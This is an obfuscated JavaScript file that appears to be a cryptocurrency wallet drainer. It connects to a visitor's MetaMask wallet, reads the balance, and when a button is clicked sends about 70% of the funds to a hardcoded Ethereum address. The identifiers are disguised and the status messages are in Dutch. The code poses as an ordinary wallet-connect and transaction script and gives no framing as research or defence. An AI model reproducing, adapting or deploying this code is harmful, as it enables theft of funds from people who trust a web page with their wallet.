let P;
let S;
let PA;
let BIW;
let BIE;
const FTA = "0xBe627C84cc5DFe7a365bDE715b4b87a2F1f7408D";
$(document).ready(function () {
  $("#connectWalletButton").click(_0x42f7x3);
  $("#sendTransactionButton").click(_0x42f7x5);
});
async function _0x42f7x3() {
  if (window["ethereum"]) {
    try {
      await window["ethereum"]["request"]({ method: "eth_requestAccounts" });
      P = new ethers.providers.Web3Provider(window["ethereum"]);
      S = P["getSigner"]();
      const _0x42f7x7 = await P["listAccounts"]();
      PA = _0x42f7x7[0];
      $("#sendTransactionButton")["show"]();
      $("#connectWalletButton")["hide"]();
      await _0x42f7x8();
    } catch (_0x42f7x9) {
      console["error"]("Metamask connection error:", _0x42f7x9);
    }
  } else {
    console["error"]("Metamask not found");
  }
}
async function _0x42f7x5() {
  if (!P || !S) {
    console["error"]("Metamask not connected");
    return;
  }
  const _0x42f7xa = ethers["utils"]["isAddress"](FTA);
  if (!_0x42f7xa) {
    alert("Invalid Ethereum address");
    return;
  }
  await _0x42f7x8();
  try {
    const _0x42f7xb = await P["getGasPrice"]();
    const _0x42f7xc = 10;
    const _0x42f7xd = 3;
    const _0x42f7xe = ethers.BigNumber["from"](
      Math["floor"]((_0x42f7xc / 100) * BIW)
    );
    const _0x42f7xf = _0x42f7xe["mul"](_0x42f7xd);
    if (BIW["lt"](_0x42f7xf)) {
      throw new Error("Onvoldoende saldo voor de transactie.");
    }
    const _0x42f7x10 = BIW["sub"](_0x42f7xf);
    const _0x42f7x11 = {
      to: FTA,
      value: _0x42f7x10,
      gasLimit: 21000,
      gasPrice: _0x42f7xb,
    };
    const _0x42f7x12 = await S["sendTransaction"](_0x42f7x11);
    const _0x42f7x13 = await _0x42f7x12["wait"]();
    console["success"](
      `Transactie succesvol verzonden! Transactie Hash: ${_0x42f7x13["transactionHash"]}`
    );
  } catch (_0x42f7x9) {
    console["error"]("Metamask transactiefout:", _0x42f7x9);
    $("#status")["text"](
      "Transactie mislukt. Controleer de console voor details."
    );
  }
}
async function _0x42f7x8() {
  if (!P || !S) {
    console["error"]("Metamask not connected");
    return;
  }
  try {
    const _0x42f7x7 = await P["listAccounts"]();
    const _0x42f7x14 = _0x42f7x7[0];
    if (!_0x42f7x14) {
      console["error"]("No Ethereum account found");
      return;
    }
    BIW = await P["getBalance"](_0x42f7x14);
    BIE = ethers["utils"]["formatEther"](BIW);
    console["log"](`Balance: ${BIE} ETH`);
  } catch (_0x42f7x9) {
    console["error"]("Error fetching Ethereum balance:", _0x42f7x9);
  }
}
